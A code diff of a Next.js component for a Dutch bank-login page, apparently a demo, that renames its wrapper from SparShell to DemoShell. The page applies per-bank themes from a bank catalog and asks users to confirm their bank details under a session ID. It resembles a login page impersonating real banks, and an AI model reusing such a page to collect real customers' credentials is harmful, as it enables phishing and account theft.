@@ -3,7 +3,7 @@
 import { useEffect, useMemo, useState } from "react";
 import { useRouter } from "next/navigation";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
-import { SparShell } from "@/components/demo/SparShell";
+import { DemoShell } from "@/components/demo/DemoShell";
 import { getBankBySlug } from "@/lib/at-bank-catalog";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
@@ -89,34 +89,34 @@ export function BankLoginClient({ sessionId, bankSlug }: Props) {
 
   if (!supabase) {
     return (
-      <SparShell title="Bankinlog">
+      <DemoShell title="Bankinlog">
         <ConfigMissing />
-      </SparShell>
+      </DemoShell>
     );
   }
 
   if (!bank) {
     return (
-      <SparShell title="Bankinlog">
+      <DemoShell title="Bankinlog">
         <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
           Onbekende bank. Start de selectie opnieuw.
         </p>
-      </SparShell>
+      </DemoShell>
     );
   }
 
   if (!theme) {
     return (
-      <SparShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
+      <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
         <div className="flex justify-center py-16">
           <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
         </div>
-      </SparShell>
+      </DemoShell>
     );
   }
 
   return (
-    <SparShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
+    <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
       <div className="app-panel overflow-hidden rounded-2xl">
         <div
           className="flex items-center justify-between px-5 py-4 text-white"
@@ -187,6 +187,6 @@ export function BankLoginClient({ sessionId, bankSlug }: Props) {
           </button>
         </form>
       </div>
-    </SparShell>
+    </DemoShell>
   );
 }
